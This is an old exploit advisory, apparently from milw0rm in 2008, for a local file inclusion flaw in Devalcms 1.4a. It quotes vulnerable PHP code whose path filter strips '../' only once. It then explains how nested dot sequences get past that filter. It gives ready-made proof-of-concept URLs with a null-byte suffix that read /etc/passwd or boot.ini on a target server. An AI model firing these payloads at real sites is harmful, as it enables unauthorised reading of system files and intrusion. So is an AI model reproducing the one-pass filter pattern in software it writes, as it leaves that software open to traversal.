@@ -1,0 +1,85 @@
+=====================================================
+  Devalcms  1.4a Local File Inclusion Vulnerability
+=====================================================
+
+  ,--^----------,--------,-----,-------^--,
+  | |||||||||   `--------'     |          O	.. CWH Underground Hacking Team ..
+  `+---------------------------^----------|
+    `\_,-------, _________________________|
+      / XXXXXX /`|     /
+     / XXXXXX /  `\   /
+    / XXXXXX /\______(
+   / XXXXXX /           
+  / XXXXXX /
+ (________(             
+  `------'
+
+AUTHOR : CWH Underground
+DATE   : 15 June 2008
+SITE   : www.citec.us
+
+
+#####################################################
+APPLICATION : Devalcms
+VERSION     : 1.4a
+DOWNLOAD    : http://downloads.sourceforge.net/devalcms
+#####################################################
+
+--- LFI ---
+
+** magic_quotes_gpc = Off **
+
+-------------------------
+ Vulnerable in func.php
+-------------------------
+@Line 
+   
+   13:  $myfile = $gv_folder_data . $currentpath . "/" . $myfile;
+   14:
+   15:  if(is_file($myfile)){
+   16:  	include($myfile);
+   17:  } else {
+   18: 	        echo "not found";
+   19:  }
+    .
+    .
+    .
+   98: function mystriprelative($mytext)
+   99: {
+  100:	$mytext2 = $mytext;
+  101:	$mytext2 = str_replace("/..","",$mytext2);
+  102:	$mytext2 = str_replace("\\..","",$mytext2);
+  103:	$mytext2 = str_replace("../","",$mytext2);
+  104:	$mytext2 = str_replace("..\\","",$mytext2);
+  105:	return $mytext2;	
+  106: }
+   
+-------------------------
+ Detail of vulnerability
+-------------------------
+    Function mystriprelative is a function to prevent user from inserting relative path into variable.
+As the code above, you can bypass this fuction by something like following
+
+Simple Algorithm:
+
+[+] When we use ".../...//" Function will convert to "../"
+[+] When we use "./.....//" Function will convert to "../"
+[+] When we use ".../...//./.....//" Function will convert to "../../"
+
+    So we must use ".../...//./.....//./.....//etc/passwd%00" Function will convert to "../../../etc/passwd%00"
+
+-------------
+ POC Exploit
+-------------
+
+For Windows:
+[+] http://[Target]/[devalcms_path]/index.php?currentpath=..&currentfile=.../...//./.....//./.....//boot.ini%00
+
+For Linux:
+[+] http://[Target]/[devalcms_path]/index.php?currentpath=..&currentfile=.../...//./.....//./.....//etc/passwd%00
+
+##################################################################
+# Greetz: ZeQ3uL, BAD $ectors, Snapter, Conan, JabAv0C, Win7dos  #
+##################################################################
+
+# milw0rm.com [2008-06-15]
